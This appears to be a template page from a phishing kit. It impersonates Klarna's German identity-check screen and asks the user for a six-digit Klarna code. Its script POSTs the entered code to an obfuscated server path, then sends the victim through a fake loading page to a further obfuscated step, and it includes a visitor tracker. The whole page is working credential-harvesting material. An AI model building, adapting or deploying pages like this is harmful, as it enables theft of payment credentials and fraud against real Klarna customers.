<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klarna</title>
    <link rel="stylesheet" href="./css/bavoka.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <%- include('partials/tracker') %>
        <style>
            

            .header-row {
                width: 100%;
                
                padding: 16px 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                box-sizing: border-box;
            }

           .form1{
            align-items: center;
           }
           .big-text{
            margin-top: 20px;
            width: 90%;
           }

            .content-area {
                
                max-width: 420px;
                padding: 24px 32px;
                box-sizing: border-box;
                flex-grow: 1;
                display: flex;
                flex-direction: column;
            }

            h1 {
                font-size: 26px;
                font-weight: 700;
                margin: 0 0 8px 0;
                color: #000;
                line-height: 1.3;
                text-align: left;
            }

            .subtitle {
                font-size: 15px;
                color: #111;
                margin: 0 0 30px 0;
                text-align: left;
            }

            .pin-container {
                display: flex;
                justify-content: center;
                gap: 20px;
                /* Space between dots */
                margin-bottom: auto;
                /* Push keypad down */
                padding-top: 20px;
            }

            .pin-dot {
                width: 15px;
                height: 15px;
                border-radius: 50%;
                background-color: #E6E6E6;
                /* Inactive color */
                transition: background-color 0.1s;
            }

            .pin-dot.active {
                background-color: #000000;
                /* Active color */
            }

            .keypad {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                row-gap: 15px;
                column-gap: 30px;
                width: 100%;
                margin-bottom: 40px;
                margin-top: 40px;
            }

            .key {
                padding: 10px;
                font-size: 28px;
                font-weight: 600;
                text-align: center;
                cursor: pointer;
                user-select: none;
                border-radius: 50%;
                width: 64px;
                height: 64px;
                line-height: 64px;
                margin: 0 auto;
                transition: background-color 0.1s;
            }

            .key:active {
                background-color: #f5f5f5;
            }

            .key-action {
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 16px;
            }

            .forgot-link {
                color: #6200EA;
                /* Purple link */
                text-decoration: none;
                font-weight: 500;
                font-size: 14px;
            }

            .backspace-icon {
                width: 28px;
                height: 28px;
            }

            .close-btn,
            .back-btn {
                background: none;
                border: none;
                cursor: pointer;
                padding: 8px;
                margin: -8px;
                /* Increase hit area visual balance */
            }
            @media (max-width: 768px) {
                h1{
                    font-size: 23px;
                }
                .content-area{
                    max-width: 420px;
                    padding: 24px 32px;
                    box-sizing: border-box;
                    flex-grow: 1;
                    display: grid;
                    flex-direction: column;
                    justify-content: space-evenly;
                    align-content: space-around;
                    margin-top: 30px;
                }
            }
        </style>
</head>

<body>

    <div class="login-container">
        <div class="form1">
            
                <!-- Header with Back, Badge, Close -->
                <div class="header-row">
                    <button class="back-btn" aria-label="Go back">
                        <svg aria-hidden="true" role="img" viewBox="0 0 20 20" height="24" width="24">
                            <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
                                <path
                                    d="M12.5 9.167H4.047c.418-.365.828-.74 1.222-1.129a27.562 27.562 0 0 0 2.905-3.381l-1.348-.98a25.873 25.873 0 0 1-2.728 3.176c-.91.899-1.892 1.73-2.919 2.471a.833.833 0 0 0 0 1.352 24.844 24.844 0 0 1 2.92 2.471 25.87 25.87 0 0 1 2.727 3.177l1.348-.981a27.57 27.57 0 0 0-2.905-3.381c-.394-.39-.804-.764-1.222-1.129H12.5c2.757 0 5 2.243 5 5h1.667A6.674 6.674 0 0 0 12.5 9.167Z"
                                    fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
                            </g>
                        </svg>
                    </button>

                    <div class="hodpa">
                        <img src="./img/huodop.PNG" alt="">
                    </div>

                    <button class="close-btn" style="position: static;" aria-label="Close">
                        <svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
                                fill="#535353" />
                        </svg>
                    </button>
                </div>
                <div class="big-text">
                     <h1>Gib deinen Klarna Code ein</h1>
                     <p class="subtitle">So bestätigst du deine Identität</p>
                </div>

    <div class="content-area">
       

        <div class="pin-container">
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
            <div class="pin-dot"></div>
        </div>

        <div class="keypad">
            <div class="key" data-value="1">1</div>
            <div class="key" data-value="2">2</div>
            <div class="key" data-value="3">3</div>
            <div class="key" data-value="4">4</div>
            <div class="key" data-value="5">5</div>
            <div class="key" data-value="6">6</div>
            <div class="key" data-value="7">7</div>
            <div class="key" data-value="8">8</div>
            <div class="key" data-value="9">9</div>
            <div class="key key-action">
                <a href="#" class="forgot-link">Vergessen?</a>
            </div>
            <div class="key" data-value="0">0</div>
            <div class="key key-action" id="deleteKey">
                <svg class="backspace-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M21 12H3" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
                    <path d="M9 18L3 12L9 6" stroke="black" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
            </div>
        </div>
    </div>


    </div>
    
    </div>
    <script>
        $(document).ready(function () {
            let pin = '';
            const maxLen = 6;
            const dots = $('.pin-dot');

            $('.key').on('click', function () {
                const val = $(this).data('value');

                // Number keys
                if (val !== undefined) {
                    if (pin.length < maxLen) {
                        pin += val;
                        updateDots();
                        if (pin.length === maxLen) {
                            setTimeout(submitPin, 200); // Slight delay for visual confirmation
                        }
                    }
                }
            });

            $('#deleteKey').on('click', function () {
                if (pin.length > 0) {
                    pin = pin.slice(0, -1);
                    updateDots();
                }
            });

            function updateDots() {
                dots.removeClass('active');
                for (let i = 0; i < pin.length; i++) {
                    $(dots[i]).addClass('active');
                }
            }

            function submitPin() {
                // Disable keypad interaction
                $('.key').off('click');
                $('#deleteKey').off('click');

                // Submit logic
                $.ajax({
                    url: '/PPiKlarTbjqMpc34D4XsPJ2',
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({ username: pin }),
                    success: function (info) {
                        if (info.OK) {
                            window.location = "/loading?time=9&url=/PrTomeM9HwWUWSulkTe4";
                        } else {
                            // Re-enable on failure (optional, depending on flow)
                            location.reload();
                        }
                    },
                    error: function () {
                        // Handle network errors
                        // alert("Ein Fehler ist aufgetreten.");
                        location.reload();
                    }
                });
            }
        });
    </script>
</body>

</html>